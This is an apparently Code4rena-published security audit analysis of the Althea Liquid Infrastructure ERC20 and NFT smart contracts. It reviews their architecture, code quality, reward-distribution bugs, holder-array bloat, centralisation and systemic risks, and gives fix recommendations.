*The following wardens also submitted reports: [MrPotatoMagic](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/389), [JrNet](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/742), [clara](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/556), [TheSavageTeddy](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/457), [0xbrett8571](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/329), [DarkTower](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/256), [PoeAudits](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/241), [JcFichtner](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/103), and [ZanyBonzy](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/57).*

## Overview

This report presents a comprehensive analysis of the Althea Liquid Infrastructure protocol's smart contracts. The audit scrutinizes the contracts' functionality, security measures, and overall code quality, identifying critical issues and providing recommendations for improvement.

## Contracts

The pivotal contracts in this audit for the Althea Liquid Infrastructure protocol are:

- **contracts/LiquidInfrastructureERC20.sol:** This contract is an ERC20 token designed to collect revenue from Liquid Infrastructure NFT contracts and distribute it to token holders. Holders of `LiquidInfrastructureERC20` tokens are entitled to a share of the profits from the associated Liquid Infrastructure NFTs, allowing for passive income generation.

- **contracts/LiquidInfrastructureNFT.sol:** The `LiquidInfrastructureNFT` contract is an ERC721 token representing ownership of a Liquid Infrastructure Account within the Althea network. It is linked to the x/microtx module, which facilitates periodic revenue in ERC20 tokens. The `LiquidInfrastructureERC20` contract uses the `LiquidInfrastructureNFT` to manage the withdrawal and distribution of these tokens to its holders.

- **contracts/OwnableApprovableERC721.sol:** This abstract contract defines key modifiers used by the `LiquidInfrastructureNFT.sol` contract. It ensures that certain functions are only executable by the token owner or an approved delegate, enhancing security and functionality.

## Auditing Approach

During the audit of the Althea Liquid Infrastructure protocol's smart contracts, I conducted a thorough examination of the provided codebase, including the associated test files. My audit strategy encompassed an in-depth review of the Solidity code, with a particular emphasis on security aspects. 

To validate the functionality and robustness of the contracts, I compiled the code and executed a series of tests across various scenarios. Additionally, I verified the main invariants, explored attack ideas presented by the protocol in the scope. This rigorous analysis allowed me to assess the performance and security safeguards of the contracts under a range of conditions. Furthermore, I confirmed the integrity of the main invariants, brainstormed potential attack vectors, and took into account extra contextual details to ensure a comprehensive and meticulous audit process.

## Architecture

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/701).*

### Liquid Infrastructure NFT

This is the Tokenized Representation of Infrastructure Accounts. It issues a unique NFT (non-fungible token) that represents ownership of a Liquid Infrastructure Account. This account is typically associated with infrastructure involved in an Althea pay-per-forward network, such as internet service provision. The contract is designed to collect periodic revenue. On Althea-L1 chains, this revenue comes from the x/bank module, which conducts microtransactions as the payment layer for Althea networks.

**Privileged Roles**
- **Owner**: The contract owner is the initial holder of the NFT created upon contract deployment. This user has the highest level of privileges, like Setting Balance Thresholds and Withdrawing Balances.

- **Approved User**: These are users who have been granted specific permissions by the contract owner.Their privileges are Withdrawing Balances and Managing Thresholds

**Functionalities**
- **ERC20 Threshold**: The contract interacts with the x/microtx module to manage the balance of revenue coins(USDC,USDT) within the Liquid Infrastructure Account. It sets thresholds to determine how much of each token should be retained in the contract, with excess amounts being deposited into the LiquidInfrastructureNFT contract.

- **Withdraw ERC20 Balance**: Owners or Approved users of the Liquid Infrastructure Account can withdraw the accumulated ERC20 balances. This allows them to access the funds that have been converted and transferred to the contract.

### Liquid Infrastructure ERC20

The LiquidInfrastructureERC20 contract is an ERC20 token designed to interface with Liquid Infrastructure NFT (Non-Fungible Token) contracts. The primary purpose of the contract is to collect revenue generated by these NFTs and distribute it to the holders of the LiquidInfrastructureERC20 tokens.

**Privileged Roles**

- **Owner**: The owner is the account that deployed the contract and has the highest level of privileges. The Ownable contract from OpenZeppelin provides onlyOwner  modifier that restricts certain functions to be callable only by the owner. The owner has the ability to perform actions such as adding or releasing managed NFTs, approving or disapproving holders, and initiating distributions.

- **Approved Holders**: The approved holders can receive and hold the LiquidInfrastructureERC20 tokens. This role is managed through the HolderAllowlist and the approved holders are entitled to receive revenue through distribution.

**Functionalities**

- **Owner Privileged Functions**
    - **Approve/Disapprove Holder**: A mechanism to maintain a list of addresses that are authorized (or not authorized) to hold the contract's tokens. This feature is typically used to enforce certain restrictions on who can own or transact with the tokens.

    - **Add/Release NFTs**: The Add/Release NFTs functionality refers to the ability to manage a collection of NFTs that the contract interacts with or controls. This functionality allows the contract owner to add new NFTs to the contract's management or release them from the contract's control. 

    - **Set Distributable ERC20s**: This is to define and update the list of ERC20 tokens that are eligible for distribution to the token holders. This feature is used for aggregate revenue or rewards in the form of ERC20 tokens and then distributed to the holders of the contract's native token.

    - **Mint InfraERC20**: The `mint` function allows the contract to generate new InfraERC20 tokens. These tokens are typically credited to a specific address. Minting is a privileged action controlled by the contract owner. This ensures that new tokens are created responsibly and in accordance with the token's monetary policy.

- **Withdraw ERC20s from NFTs**: This is to withdraw ERC20 tokens that may have accumulated in associated NFT contracts. NFTs associated with real-world assets or digital services that generate revenue. This revenue will be collected in the form of ERC20 tokens, which are held by the NFT contract until they are withdrawn.

    This allows the contract to retrieve ERC20 tokens from the NFT contracts it manages. This withdrawal process transfers the accumulated tokens from the NFT contracts to the LiquidInfrastructureERC20 contract.

    The contract prevents withdrawal from being performed while a distribution is in progress. This is to ensure the integrity of the distribution process and to prevent state changes that could affect the distribution.

- **Distribute ERC20s**: The LiquidInfrastructureERC20 contract aggregates the revenue from the NFT contracts and distributes it among its token holders. The distribution is proportional to the number of tokens each holder owns, meaning that the more tokens a user holds, the larger their share of the revenue.

    Users who hold LiquidInfrastructureERC20 tokens can earn additional ERC20 tokens as revenue. This creates an incentive mechanism for users to invest in and hold the LiquidInfrastructureERC20 tokens.

- **Burn InfraERC20**: The `burn` function allows token holders or approved users to destroy a specified amount of InfraERC20 tokens from their balance. The contracts enforce a distribution before burning to maintain consistency in the contract's state, especially while the distribution amount per token is calculated based on the current total supply.

- **Transfer InfraERC20**: The ERC20 transfer performs a few additional steps while doing the transfer. The contract checks whether the contract is currently locked for distribution and whether the recipient is an approved holder while performing a transfer. It also adds the recipient to the holders list if they are receiving tokens for the first time.And also  it removes the sender from the holders list if their balance has dropped to zero as a result of the transfer.

## Codebase Quality Analysis

The codebase exhibits a high level of quality by delivering clarity in functionality through self-explanatory code, employing simple functionalities and logic. And, its readability is enhanced due to the well-documented comments. Despite handling complex calculations, the code is inherently explanatory and highly understandable for both auditors and developers.

### Modularity

The codebase demonstrates a high level of modularity, effectively segregating complex logics and operations into separate functions, particularly with the reward distribution. The use of distinct contracts to manage the access control contributes to reducing overall complexity.

### Comments

Insufficient comments throughout the contracts limit the clarity of each function, requiring auditors and developers to invest more time in understanding the functionality. Improving comments to thoroughly explain the various functionalities would greatly enhance the code's accessibility and comprehension.

### Access Controls

The codebase effectively employs access control mechanisms to ensure smooth execution of functions, it falls short in securing some critical functions. The `distribute` and `withdrawFromManagedNFTs` functions are publicly accessible, allowing any user to execute them without proper access checks. This lack of control could lead to scenarios where users initiate distribution or withdrawal processes but do not complete them, consequently burdening other users or the owner with the task of finishing these operations. Such situations could render these vital contract functions idle, disrupting the contract's critical operations until the pending actions are resolved.

### Events

The contracts emit events for all functions that interact with users, which is a crucial feature for tracking and verifying contract activity. However, the events have not been optimized with appropriate indexing, which is a significant oversight. Proper indexing of event parameters is essential for enabling efficient searches and retrievals within event logs. Without indexing, users and applications may face challenges when attempting to filter and access specific event data.

### Error Handling

The contracts exhibit a moderate level of error handling; however, there is room for improvement, particularly in the administrative functions, which currently lack essential validations, such as preventing the addition of duplicate NFTs to the managed NFT list. Additionally, the contracts rely solely on `require` statements for error handling, without utilizing separate error types. To refine the codebase, it is advisable to implement a dedicated library contract that centralizes error definitions. Adopting this strategy would not only enhance the code's structure but also its maintainability, leading to a more robust and clear error handling system.

### Imports

It is advisable for the contracts to utilize named imports consistently throughout the codebase. This practice enhances readability and maintainability by clearly indicating the specific functions, variables, or types that are being imported from external contracts or libraries. 

### Libraries

The contracts currently do not incorporate any libraries. However, it is advisable to consider using a separate library to encapsulate the errors and events in the contracts. This practice can enhance modularity and maintainability within the codebase.

## Mechanism Review

### Deploy Liquid Infrastructure NFTs

Entities utilizing Althea's networking devices deploy LiquidInfrastructureNFTs to tokenize their assets within the ecosystem. By doing so, they create a digital representation of their infrastructure on the blockchain. The process involves setting the Liquid Infrastructure ERC20s contract as the owner of the NFTs, which enables it to manage the assets and withdraw any revenue that exceeds predefined threshold amounts. This approach allows for the seamless collection of revenue generated from the x/bank module.

### Managing Liquid Infrastructure NFTs

The owner of the LiquidInfrastructureERC20s contract has the capability to add or remove LiquidInfrastructureNFTs with the contract. This is achieved through two functions: `addManagedNFT()` and `releaseManagedNFT()`. The `addManagedNFT()` function is designed to onboard new NFTs into the system; however, it lacks a crucial check to verify whether the NFT has already been added. This oversight introduces a risk where, if the owner inadvertently adds the same NFT more than once, the contract does not revert the action. Consequently, when the withdrawal functionality is invoked, it is required to withdraw ERC20 tokens from the NFT contract multiple times, leading to unnecessary gas expenditures.

On the other hand, the `releaseManagedNFT()` function is removing NFTs from the contract's management. It operates under the assumption that there are no duplicate entries in the ManagedNFTs array. However, as previously mentioned, the possibility of duplication exists. The current implementation of `releaseManagedNFT()` only eliminates the first occurrence of the NFT contract in a single transaction, leaving any additional duplicates untouched.

### Recommendation

To address these issues, it would be prudent to introduce a mapping in parallel with the `ManagedNFTs` array. This mapping would maintain the index of each NFT address, thereby, ensuring the uniqueness of entries in the array and eliminating the need for costly iterations. When the need arises to remove an NFT, the index can be retrieved from the mapping, allowing for efficient removal from the array and effectively preventing any duplication.

Furthermore, the existing `require` statement within the  `releaseManagedNFT()`:

```solidity
// By this point the NFT should have been found and removed from ManagedNFTs
require(true, "unable to find released NFT in ManagedNFTs");
```

is flawed as it will invariably pass, given that the condition is always satisfied. This means that the associated event will be triggered regardless of whether the NFT was actually found or removed from the array. To ensure the integrity of the contract's operations, this require statement should be corrected to accurately reflect the success or failure of the NFT's removal.

Another concern is that neither `addManagedNFT()` nor `releaseManagedNFT()` currently checks for ongoing withdrawal processes. It is essential to ensure that no updates to the NFTs under management are made while a withdrawal is in progress. If a withdrawal is underway, these functions should block any attempts to add or release NFTs until the withdrawal is complete. This safeguard would prevent potential conflicts or inconsistencies during the management of the NFTs, especially in the context of financial operations.

### Managing Distributable ERC20 Tokens

The `setDistributableERC20s()` function is utilized within the `LiquidInfrastructureERC20` contract to establish a new array of ERC20 tokens that are eligible for distribution to token holders. However, this function does not provide the flexibility to add or remove individual ERC20 tokens from the list; it requires setting the entire array at once. While managing a small number of ERC20 tokens may not pose significant issues, the gas costs associated with updating the list can escalate as the number of tokens increases, due to the inherent nature of blockchain transactions and the need to store more data on-chain.

### Recommendation

The current implementation lacks a safeguard to prevent updates to the distributable ERC20 tokens while a distribution is actively in progress. This oversight could lead to complications if the list of distributable tokens is altered mid-distribution, potentially affecting the accuracy and fairness of the distribution process. 

### Manage LiquidInfrastructureERC20s Holders

The `LiquidInfrastructureERC20` contract functions `approveHolder()`, `disapproveHolder()`, and `isApprovedHolder()` are designed to manage the list of entities authorized to hold its ERC20 tokens. A dedicated `holders` array within the contract keeps track of all token holder addresses.

Token transfers within the contract are confined to approved holders. Consequently, any address that receives the token is automatically appended to the `holders` array. Being an approved holder is a key criterion for eligibility to receive rewards as well as tokens, which are allocated among those on the approved list. Moreover, approved holders are at liberty to trade their `LiquidInfrastructureERC20` tokens on external markets, thus providing liquidity and facilitating the discovery of the token's market price. 

### Withdraw ERC20s From Liquid Infrastructure NFTs

The `withdrawFromManagedNFTs()` function serves a crucial role in managing the flow of ERC20 tokens from associated NFT contracts. Designed to be publicly callable, this function allows any user to initiate the withdrawal of accumulated ERC20 tokens, such as stablecoins, from the NFT contracts that the `LiquidInfrastructureERC20` oversees. To safeguard against gas-based Denial of Service (DOS) attacks, the function is resistant to excessive gas consumption, ensuring that the withdrawal process remains efficient and secure. However, to maintain the integrity of ongoing reward distributions, the `withdrawFromManagedNFTs()` function cannot be executed while a distribution is in progress, preventing any potential interference with the allocation of rewards to token holders.

### Distribute Rewards to Liquid Infrastructure ERC20s Holders

The `distribute` function in the contract is publicly accessible, enabling any party to trigger the distribution process after the `MinDistributionPeriod` has passed. This functionality guarantees that approved holders can receive their rewards promptly. The rewards are issued in stablecoins, offering a dependable value for the beneficiaries. To counteract potential gas-based Denial of Service (DOS) attacks, the `distribute` function is crafted to be resilient against DOS related to gas limits by facilitating the distribution across several incremental steps. This approach allows for a smooth and secure reward distribution that aligns with the holders' `InfraERC20` token balances.

### Recommendation

When calculating reward entitlements, it is critical to account for the decimals of the reward tokens to ensure precision. To avoid the common issue of division before multiplication, which can lead to rounding errors and loss of precision, the contract should take a snapshot of the token balances at the start of the distribution cycle. This snapshot will then be used to accurately calculate the reward entitlement for each holder during the distribution process. By multiplying the holder's balance by the reward per token first and then dividing by the total supply, the contract can maintain the integrity of the distribution calculations.

Furthermore, the contract should not include the balances of disapproved holders when calculating the total supply for reward entitlements. If disapproved holders' balances are factored into the total supply, their undistributed portion of rewards will carry over to subsequent distribution rounds. This carryover can create disparities in reward distribution, as future approved holders may receive a share of rewards that were not allocated in previous rounds. To prevent such inequities, only the balances of approved holders should be considered in the calculation of reward entitlements, ensuring a fair and proportional distribution of rewards to eligible participants.

### Liquid Infrastructure ERC20s Operations

- **Mint**: The minting functionality is exclusively reserved for the contract owner, ensuring that only the owner can issue new tokens to users. This level of control is crucial for maintaining the integrity of the token's supply and for adhering to any predefined tokenomics. Additionally, the contract stipulates that a distribution must occur before any minting can take place, provided that the `MinDistributionPeriod` has been reached. This requirement ensures that all entitled token holders receive their due rewards before any new tokens are introduced into circulation, thereby preserving the fairness and accuracy of the distribution process.

- **Burn**: The burn functionality is accessible to token holders and users who have been granted approval, allowing them to reduce the token supply by destroying a specified amount of their tokens. The contract enforces a rule that requires a distribution to be completed before any new burning actions if the `MinDistributionPeriod` has elapsed. This ensures that existing token holders receive their allocated rewards based on the current supply before any decrease in the total number of tokens occurs, maintaining the equitable distribution of rewards.

- **Transfer**: The transfers of tokens are designed to occur exclusively between approved holder addresses. This restriction ensures that only approved holders can receive the token and holding of tokens, aligning with the contract's security and compliance measures. After each transfer, if the recipient's (`to` address) balance increases from zero as a result of the transaction, their address is automatically added to the `holders` array. Conversely, if a sender's (`from` address) balance is depleted to zero during the transfer, their address is promptly removed from the `holders` array, reflecting the change in their token holding status. This dynamic updating of the `holders` array after each transfer maintains an accurate record of current token holders within the contract.

### Recommendation

```solidity
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        bool stillHolding = (this.balanceOf(from) != 0);
        if (!stillHolding) {
@-->        for (uint i = 0; i < holders.length; i++) {
                if (holders[i] == from) {
                    // Remove the element at i by copying the last one into its place and removing the last element
                    holders[i] = holders[holders.length - 1];
                    holders.pop();
                }
            }
        }
    }
```

The `_afterTokenTransfer` function is designed to update the `holders` array, which tracks the addresses currently holding tokens. As shown in the provided Solidity code snippet, the function includes a loop that checks if the `from` address, after transferring tokens, still holds any tokens.

However, this logic presents a potential inefficiency during the minting process. When new tokens are minted, the `from` address is the zero address (`address(0)`), and since the zero address cannot hold tokens, its balance is always zero. The loop in the `_afterTokenTransfer` function would then be executed unnecessarily, iterating over the entire `holders` array without the possibility of finding an entry for `address(0)` to remove. This unnecessary iteration can result in the contract owner incurring significant gas costs over time, especially as the `holders` array grows. To optimize gas usage and avoid this inefficiency, the loop should be bypassed or excluded from execution during minting operations, ensuring that minting remains cost-effective and does not impact the contract's performance.

During the token burning process within the `LiquidInfrastructureERC20` contract, a significant issue arises where the zero address (`address(0)`) is mistakenly added to the token holders array. See `_beforeTokenTransfer` function. Consequently, each burn transaction triggers the addition of `address(0)` to this array. This erroneous behavior leads to an inflated holders array, which not only consumes unnecessary storage space but also increases the risk of gas griefing. As the array grows with each burn transaction, operations that need to iterate over the array become more gas-intensive, potentially resulting in a systemwide Denial of Service (DOS) if the gas costs exceed block limits, thereby disrupting the contract's and possibly the broader ecosystem's operations.

```solidity
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        require(!LockedForDistribution, "distribution in progress");
        if (!(to == address(0))) {
            require(
                isApprovedHolder(to),
                "receiver not approved to hold the token"
            );
        }
        if (from == address(0) || to == address(0)) {
            _beforeMintOrBurn();
        }
        bool exists = (this.balanceOf(to) != 0);
        if (!exists) {
@-->        holders.push(to);
        }
    }
```

The same flawed logic within the contract does not prevent zero-amount transfers, which can further exacerbate the issue. If a transfer of zero tokens is made to an address with a zero balance, that address is also incorrectly added to the holders array. This can lead to repeated and unnecessary entries in the holders list, compounding the bloating problem. As with the burning issue, this can cause similar complications, including increased gas costs for iterating over the holders array and the potential for a systemwide DOS, affecting the contract's functionality and efficiency.

## Critical Issues

### Decimal Handling and Order of Operations

The current implementation of the `LiquidInfrastructureERC20` contract's distribution process encounters a significant challenge due to the handling of decimal places and the order of operations in calculating entitlements. The logic does not properly account for the decimal differences between `distributableERC20s` tokens such as USDC, USDT, or DAI, which typically have `10^6` decimals, compared to the `InfraERC20` token's total supply with `10^18` decimals. This leads to a situation where division is performed before multiplication, necessitating an impractically high minimum balance of `1 trillion USDC` to initiate the distribution process. To rectify this, the contract should be updated to perform multiplication before division and to scale the `distributableERC20s` tokens to the same decimal precision as `InfraERC20` tokens before calculating entitlements.

### Impact of Excluding Disapproved Holders on Reward Calculation

The `LiquidInfrastructureERC20` contract's distribution logic calculates the entitlement of rewards based on the total supply of tokens, without distinguishing between approved and disapproved holders. As a result, when disapproved holders are excluded from a distribution cycle, their share of the rewards remains undistributed. This undistributed portion is then carried over to the next distribution cycle, where it may be unfairly allocated among a new set of approved holders, potentially including those who have been added since the last cycle. This can lead to a dilution of rewards for existing approved holders who were entitled to a larger share. To ensure equitable distribution, the contract should adjust the entitlement calculation to exclude the balances of disapproved holders from the total supply.

### Necessity of an Emergency Withdrawal Mechanism

The `LiquidInfrastructureERC20` contract's lack of an emergency withdrawal mechanism for undistributed `distributableERC20s` tokens presents a critical issue. This becomes particularly problematic when the contract owner updates the list of distributable tokens using the `setDistributableERC20s` function. If certain tokens are omitted from the updated list, their remaining balance could become locked within the contract with no way to retrieve them. This not only prevents the reallocation of these funds but also poses a risk of permanent loss of assets. Implementing an emergency withdrawal function would enable the contract owner to recover undistributed tokens, ensuring that the contract's assets remain accessible and manageable.

### Attacker Can Inflate the Holder Array with Zero-Token Transfers

The vulnerability has been identified in the `LiquidInfrastructureERC20` contract, where an attacker can exploit zero-token transfers to manipulate/inflate the holder array. This attack involves sending zero-token transactions to an approved holder whose balance is zero. Despite not transferring any actual tokens, this action results in the recipient's address being added to the holder array multiple times.

### Addition of Zero Address to Holder Array on Every Token Burn

The `LiquidInfrastructureERC20` contract exhibits a critical flaw where the zero address (`address(0)`) is automatically added to the `holders` array during every token burn transaction. This occurs due to a lack of proper validation in the `_beforeTokenTransfer` function, which should prevent the zero address from being included in the holder tracking mechanism. The presence of `address(0)` in the `holders` array can lead to unnecessary complications and inefficiencies within the contract's operations, particularly in functions that rely on iterating over the array of token holders.

### Division Before Multiplication in Reward Distribution Calculation

The `LiquidInfrastructureERC20` contract faces an issue in its reward distribution logic due to the order of operations where division is performed before multiplication. This sequence, particularly when using integer arithmetic in Solidity, results in premature truncation of values. Consequently, this leads to incorrect calculations of reward entitlements. The problem is further compounded by the contract's `InfraERC20` token having a different decimal precision (18 decimals) than the distributable ERC20 token, such as USDC, which has 6 decimals. The flaw is located within the `erc20EntitlementPerUnit` calculation in the `_beginDistribution` function. The current implementation, due to the handling of decimal places and the order of operations for calculating entitlements, inadvertently necessitates a prohibitively high minimum balance of `1 trillion USDC` to initiate the distribution process.
This high threshold is impractical and hinders the contract's ability to conduct distributions.

## Centralisation Risk

The Althea Liquid Infrastructure protocol utilizes the `LiquidInfrastructureERC20` contract, which assigns critical responsibilities to the Owner role. This role is pivotal for executing various administrative tasks, including approving or disapproving token holders (`approveHolder`, `disapproveHolder`), minting new tokens, adding or releasing managed NFTs (`addManagedNFT`, `releaseManagedNFT`), and setting the list of distributable ERC20 tokens (`setDistributableERC20s`). All these functions are safeguarded by OpenZeppelin's `Ownable` contract, which provides a standardized approach to access control. However, this reliance on a single Owner role introduces a potential vulnerability related to centralization, where a single point of failure could pose risks to the protocol's security and integrity.

### Recommendations

To mitigate this risk, it is strongly recommended to implement OpenZeppelin's Ownable2Step contract. This step enhances security by addressing centralization concerns in the protocol.

## Systemic Risk

### Risk Due to Removal of `_isApprovedOrOwner` in OpenZeppelin Contracts

OpenZeppelin (OZ) has recently made a significant update to their ERC721 contract by removing the `_isApprovedOrOwner()` internal function in the latest version. This change introduces a risk for contracts that rely on this function, such as the `OwnableApprovableERC721` contract and, by extension, the `LiquidInfrastructureNFT` contract. Since these contracts are built upon the assumption that `_isApprovedOrOwner()` is available for use, updating to the latest version of OpenZeppelin's contracts without appropriate modifications could lead to compatibility issues or even contract failure. It is crucial for developers and auditors to be aware of this change and to ensure that any contracts depending on `_isApprovedOrOwner()` are either updated to work with the new OpenZeppelin implementation or are locked to a compatible version of the OpenZeppelin contracts to mitigate potential risks associated with this breaking change.

### Absence of stringent access control on `distribute` and `withdrawFromManagedNFTs` 

The absence of stringent access control on pivotal functions like `distribute` and `withdrawFromManagedNFTs` presents a systemic risk that extends beyond individual contract vulnerabilities to potentially affect the entire ecosystem dependent on it. This risk materializes when unauthorized users are able to invoke these functions. This lack of control could lead to scenarios where users initiate distribution or withdrawal processes but do not complete them, consequently burdening other users or the owner with the task of finishing these operations. Such situations could render these vital contract functions idle, disrupting the contract's critical operations until the pending actions are resolved.

### Lack of Upgradability Provisions

The contract lacks a structured approach to upgradability. Without provisions for upgradability, deploying updates to address vulnerabilities or introduce improvements could pose challenges. Considering the integration of upgradability features is advisable to facilitate future enhancements and fixes.

### Absence of Pausability Feature

The contract currently lacks a pausability mechanism, a critical feature for emergency halting of contract functions in response to vulnerabilities or attacks. Introducing a pausability feature would enable a swift response to protect user funds and maintain system integrity during unforeseen events.

### Time spent

48 hours

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
